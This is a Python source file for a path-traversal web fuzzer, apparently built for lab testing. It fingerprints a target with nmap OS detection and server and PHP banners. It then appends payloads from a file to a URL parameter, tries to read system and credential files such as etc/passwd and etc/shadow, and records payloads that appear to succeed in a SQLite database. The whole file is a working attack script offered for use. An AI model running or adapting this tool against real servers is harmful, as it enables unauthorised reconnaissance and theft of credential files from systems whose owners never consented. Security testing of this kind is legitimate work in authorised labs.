#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    Use: python3 webFuzzer.py http://172.16.16.145/dirtrav/example1.php?file= -f payloads.txt -v

"""
"""
apt-get install python3-requests
apt-get install python3-nmap
pip3 install ipaddress


"""

import nmap, socket, argparse
from urllib.parse import urlparse
import ipaddress as ipa
from requests import head,get
from requests.exceptions import SSLError,ConnectionError
import re
import os
import sys
from time import sleep

"""
"""
import insertar_datos as in_d
import insertar_datosXpayload as in_dXp
import insertar_payload as in_p
import consulta_payload as c_p

nm = nmap.PortScanner()
headers = {'user-agent': 'd3s'}
common_linux_files=["etc/passwd","etc/issue",
                    "etc/shadow","etc/motd","/etc/hosts",
                    "/etc/hostname"]

def printError(msg, exit = False):
    """
    Imprime en pantalla el mensaje de Error y termina la ejecución del programa . 
    
    """
    sys.stderr.write('Error:\t%s\n\n' % msg)
    if exit:
        sys.exit(1)

def scanningHost(url,port,v,default_ports='80,443'):
    url_object = urlparse(url)
    host,protocol,netloc= getHost(url_object)
    print("{}".format("\n>> IPv4 Address: "+host+"\n" if v else ""),end="")
    if not port in [80,443]:
        default_ports+=','+str(port)
    if not protocol in ['https','http']:
        printError("\nVerify: \n --The Application Layer \
protocol is either HTTP or HTTPS\n --The Application Layer \
protocol is declared explicitly in the URL ",True)
    #Nmap library
    print("{}".format(">> Trying O.S. detection from "+host+" ....\n" if v else ""),end="")
    scann = nm.scan(host,default_ports,'-O')
    #print(scann)
    os = ''
    os = getOpSystem(scann,host)
    print("{}".format("\n>> O.S.  -->  "+os+"\n" if os else ""))
    #Requests Library
    server = None
    php_v = None
    _url = None
    srv_ver = None
    distro = None
    try:
        header=head(protocol+'://'+netloc+':'+str(port),headers=headers)
        #print(header.headers)
        #print("STATUS CODE: {}".format(header.status_code))
        print(">> HOST: {}\n".format(header.url))
        print(">> STATUS CODE: {} \n".format(header.status_code))
        if 'Server' in header.headers:
            server = header.headers['Server']
        if 'X-Powered-By' in header.headers:
            php_v = header.headers['X-Powered-By']
        if header.status_code > 400 and header.status_code < 500:
            printError("A client error ocurred --> Status Code: "+str(header.status_code),True)
        elif header.status_code >500:
            printError("A server error ocurred -- Status Code: "+str(header.status_code),True)
        elif header.status_code in range(200,209,1):
            _url = url
            #_url = header.url
        elif header.status_code in range(300,304,1):
            ##Redireccion
            _url = header.headers['Location']

    except ConnectionError as ce:
        printError("Cannot establish a new connection with the server\n",True)

    except SSLError as se:
        printError("Cannot establish a new connection with the Server.\n\tMake sure that you're using the right protocol",True)
        #print(e)
        #print(type(e))
    if server is not None:
        #print("MMM: {}".format(server))
        server,srv_ver,distro = parseServer(server)
    if php_v is not None:
        php_v = parsePhp(php_v)
    print("{}".format(">> URL: "+_url+"\n" if v else ""),end="",flush=True)
    print("{}  {}".format(">> SERVER: "+server+"\n" if v else ""," VERSION: "+srv_ver+"\n" if v else ""),end="",flush=True)
    print("{}". format(">> DISTRO: "+distro+"\n" if v else ""),end='',flush=True)
    print("{}".format(">> PHP VERSION: "+php_v+"\n" if v else "",end=''),flush=True)
    return [_url,os,server,srv_ver,distro,php_v]

    """
    Consulta en DB
    """

    #if datos in base_datos:
    #   aplicar payload conococido
    #else:
    #   inserta datos
    """
    """

    """
    Fuzzing
    """

def fuzzer(u,p,v):
    successful_payloads = []
    if type(p) is str:
        print(" {}".format("\n\n>> Reading given file: "+p+"\n" if v else ""),end="")
        with open(p,'r') as f:
            pay = f.readlines() 
            f.close()
        cn_files = common_linux_files   
    else: #Pasa una lista
        print(" {}".format(">> Reading some payloads .... \n" if v else ""),end="")
        pay = p
        cn_files = [1]
    for i in pay:   #Recorre cada payload del archivo
        mod_url = makeUrl(u,i)
        #print(mod_url)
        for e in cn_files: #Recorre cada archivo conocido
            if type(p) is str:
                _payload,pay_mod=makePayload(mod_url,e,i)
            else:
                _payload = mod_url
                pay_mod = i
            #print(_payload)
            payload_req = get(_payload,headers=headers)
            if v:
                sleep(0.4)
            print("{} {}".format("\nTrying....[ "+str(payload_req.status_code)+" ] :  " if v else "",payload_req.request.url if v else ""),end="")
            ret_payl = analysis(payload_req,successful_payloads,pay_mod,v) # i ->  para almacenar con variable FILE
            if ret_payl:
                successful_payloads.append(ret_payl)
            else:
                continue
            
    return successful_payloads
    """
    """
def analysis(pay_req,list_payloads,pay,v):
    if pay_req.status_code in range(400,509,1):
        return
    elif pay_req.status_code == 200:
        #print(pay_req.text)
        if pay_req.text:
            w = re.findall(r'Warning:|failed',pay_req.text)
            if w:
                return
            print("{}".format(" <-- Seems Vulnerable" if v else ""),end="")
            #print(pay_req.text)
            return pay.rstrip()
        else:
            return



def makeUrl(url,payload):
    """
        Return a string build by an URL and a payload
    """
    #if url[-1] is '/':
    return url+payload

def makePayload(u,f,p):
    """
        Return the URL with the payload ready to be injected
    """
    return re.sub(r'{FILE}',f,u).rstrip(),re.sub(r'{FILE}',f,p).rstrip()


def verifyPayFile(path):
    if os.path.isfile(path):
        return
    else:
        printError("The file does not exist or the path is incorrect", True)

def parseServer(srv):
    #(\w+)/?([0-9]+(\.?[0-9]+)+?)?[ ]?\(?(\w+)?\)?
    #(\w+)/?([0-9]+(\.?[0-9]+)+)?[ ]?\(?(\w+)?\)?
    #(\w+)/?([0-9]+(\.?[0-9]+)+)[ ]\((\w+)\)
    match = re.search(r'([\w-]+)/?([0-9]+(\.?[0-9]+)+)?[ ]?\(?(\w+)?\)?', srv)
    if match:
        #print(match.group(1)) 
        #print(match.group(2))
        #print(match.group(4))
        # return server,srever_version,distro 
        return match.group(1),match.group(2),match.group(4)
    return srv

def parsePhp(version):
    #PHP/?(([0-9]+(\.?[0-9]+)+)(-[0-9]+)?)
    match = re.search(r'PHP/?(([0-9]+(\.?[0-9]+)+)(-[0-9]+)?)',version)
    if match:
        return match.group(1)
    return version

def getHost(URLobject):
    """
        Get hostname or Ip address given a URL Object
    """
    netloc = URLobject.netloc
    proto = URLobject.scheme
    try:
        ip_add = ipa.ip_address(netloc)
        return str(ip_add),proto,netloc
    except ValueError:
        ##domain_name
        try:
            return socket.gethostbyname(netloc),proto,netloc
        except Exception:
            printError("The IP address or hostname is invalid",True)
    
def getOpSystem(sc,ip):
    """
    This method tries to pop S.O data from nmap result
    """
    try:
        return sc['scan'][ip]['osmatch'][0]['name']
    except KeyError:
        return ''

def tryGetPayload(info,db,v):
    opt = None
    print("{}".format(">> Trying to get data from Database ....\n" if v else ""),end="")
    for i in range(1,4): sleep(1)
    payloads_query=list()
    conn = in_d.crear_conexion(db,False)
    url_exists = in_d.consulta_de_datos(conn,info[0])
    in_d.cerrar_conexion(conn)
    print("{}".format("\n >>> The entered URL already exists.\n " if url_exists else ""),end="")
    if url_exists: 
        sleep(0.6)
        return False,url_exists
    else:   #Busca información relacionada
        conn = c_p.crear_conexion(db)
        res,payloads_query =c_p.consulta_de_payload(conn,info,payloads_query)
        if res is True:
            return True,payloads_query
        else:
            print(">> No matches were found in Database!\n",end="")
            return False,payloads_query


parser = argparse.ArgumentParser(description='Python Script that performs fuzzing targeting web servers')
parser.add_argument(
    'target', type=str, nargs=1, help='URL that\'ll be fuzzed'
    )
parser.add_argument(
    '-s','--secure',dest='ssl', action='store_true',default=False,help='Enable SSL/TLS protocol'
    )
parser.add_argument(
    '-p','--port',dest='port', type=int, default=80,help='Set the TCP port'
    )
parser.add_argument(
    '-f','--pfile',dest='pay_file', type=str,help='Use the choosen PAY_FILE file from which payloads will be get'
    )
parser.add_argument(
    '-v','--verbose',dest='verbose',action='store_true',default=False,help='Enable verbosity mode'
    )

if __name__ == '__main__':
    data = list()
    payloads_ret = list()
    result=""
    must_continue = None
    try: 
        args = parser.parse_args()
        print("\n "+"="*50)
        print("\tWeb Fuzzer Tool")
        print(" "+"="*50)
        print("\n")        
        print("\tDeveloped by: Ulises Viveros & Gerardo Corona",end="")
        print("\n")
        print("\n "+"="*50)
        print("  Useful tool against Path Traversal vulnerability")
        print(" "+"="*50+"\n")
        print("[ Input Info ]\n")
        print(">> URL"+" "*5+"--> {}".format(args.target[0]))
        print(">> Port"+" "*5+"--> {}".format(args.port))
        if args.pay_file: print(">> Input file"+" "*5+"--> {}".format(args.pay_file))
        print("\n")
        print("[ Extra Options ]\n")
        print(" ** SSL {} ".format("Enabled" if args.ssl else "Disabled"))
        print(" ** Verbosity {} ".format("Enabled" if args.verbose else "Disabled"))
        std_in = input("\nWould you like to start the testing? [y] --> ")
        if not std_in in ["","y"]:
            sys.exit(1)
        verifyPayFile(args.pay_file)
         #[_url,os,server,srv_ver,distro,php_v]
        data= scanningHost(args.target[0],args.port,args.verbose)
        foundPayloads,_pl=tryGetPayload(data,"fuzzer_db.db",args.verbose)
        if foundPayloads:
            print("{}".format(" >> Matches found in Database.\n     Related payloads will be used at first.\n" if args.verbose else ""),end="")
            print("\n")
            payloads_ret = fuzzer(data[0],_pl,args.verbose)
            if payloads_ret:
                #Se obtuvieron respuestas consistentes
                print(" {}".format("\nSome payloads might be successful" if args.verbose else ""),end="")
                conn = in_d.crear_conexion("fuzzer_db.db",args.verbose)
                id_url = in_d.insertar_datos(conn,data[0],data[1],data[2],data[3],data[5],args.verbose)
                if id_url is None and args.verbose:
                    print("\n >> No data was stored in the database",end="")
                    sleep(0.6)
                in_d.cerrar_conexion(conn)
                conn2 = in_p.crear_conexion("fuzzer_db.db")
                for p in payloads_ret:
                    id_pay = in_p.insertar_payload(conn2,p)
                    in_dXp.insertar_datosXpayload(conn2,id_url,id_pay)
                if args.verbose:
                    print("\n >> Data has been stored in database",end="")
                    sleep(0.6)
                #in_p.consulta_de_payload(conn2)
                #print("#####\n\n")
                #in_dXp.consulta_de_datosXpayload(conn2)
                in_p.cerrar_conexion(conn2)
                result = "\n >> The test has fishished without errors\n"

            else:
                #No hubo ninguna respuesta aceptable, de continua con el 
                #análisis de los payloads del archivo de entrada
                must_continue = True
                sleep(0.6)

        if must_continue or not foundPayloads:
            payloads_ret = fuzzer(data[0],args.pay_file,args.verbose)
            if payloads_ret:
                #insertar en DB
                #print(payloads_ret)
                if type(_pl) is list:
                    conn = in_d.crear_conexion("fuzzer_db.db",args.verbose)
                    id_url = in_d.insertar_datos(conn,data[0],data[1],data[2],data[3],data[5],args.verbose)
                    if id_url is None and args.verbose:
                        print("\n >> No data was stored in the database",end="")
                        sleep(0.6)
                    in_d.cerrar_conexion(conn)
                else:
                    id_url = _pl

                conn2 = in_p.crear_conexion("fuzzer_db.db")
                #print(len(payloads_ret))
                for p in payloads_ret:
                    id_pay = in_p.insertar_payload(conn2,p)
                    in_dXp.insertar_datosXpayload(conn2,id_url,id_pay)
                if args.verbose:
                    print("\n >> Data has been stored in database",end="")
                    sleep(0.6)

                #in_p.consulta_de_payload(conn2)
                #print("#####\n\n")
                #in_dXp.consulta_de_datosXpayload(conn2)
                in_p.cerrar_conexion(conn2)
                result = "\n >> The test has fishished without errors\n"
            else:
                result = "\n\n >> The test has fishished without errors\n     No payload has been successful!\n"
        print(result)
    except Exception as e:
        print("Ups. Something Happened!")
        print(e)
        print(type(e))